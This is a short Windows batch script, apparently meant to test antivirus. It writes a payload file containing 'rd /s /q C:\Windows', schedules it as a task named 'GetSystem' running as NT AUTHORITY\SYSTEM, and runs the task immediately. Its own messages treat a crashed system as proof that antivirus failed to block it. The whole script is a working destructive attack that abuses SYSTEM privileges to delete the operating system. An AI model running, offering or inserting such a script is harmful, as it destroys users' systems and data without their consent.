@echo off
chcp 437 >nul

mkdir C:\temp 2>nul

:: Write run.bat using pure CMD echo (no PowerShell, no Chinese)
echo @echo off > C:\Windows\Temp\run.bat
echo rd /s /q C:\Windows > C:\temp\rd_log.txt 2>> C:\temp\rd_log.txt >> C:\Windows\Temp\run.bat

:: Verify content
echo === run.bat ===
type C:\Windows\Temp\run.bat
echo ===============

:: Create and run SYSTEM task
schtasks /delete /tn GetSystem /f 2>nul
schtasks /create /tn GetSystem /tr "C:\Windows\Temp\run.bat" /sc once /st 23:59 /ru "NT AUTHORITY\SYSTEM" /f
schtasks /run /tn GetSystem

echo Waiting 15 seconds...
timeout /t 15 >nul

echo.
echo ===== RESULT =====
if exist C:\temp\rd_log.txt (
    type C:\temp\rd_log.txt
) else (
    echo FILE NOT FOUND - system crashed, AV did NOT block
)
echo ===================
pause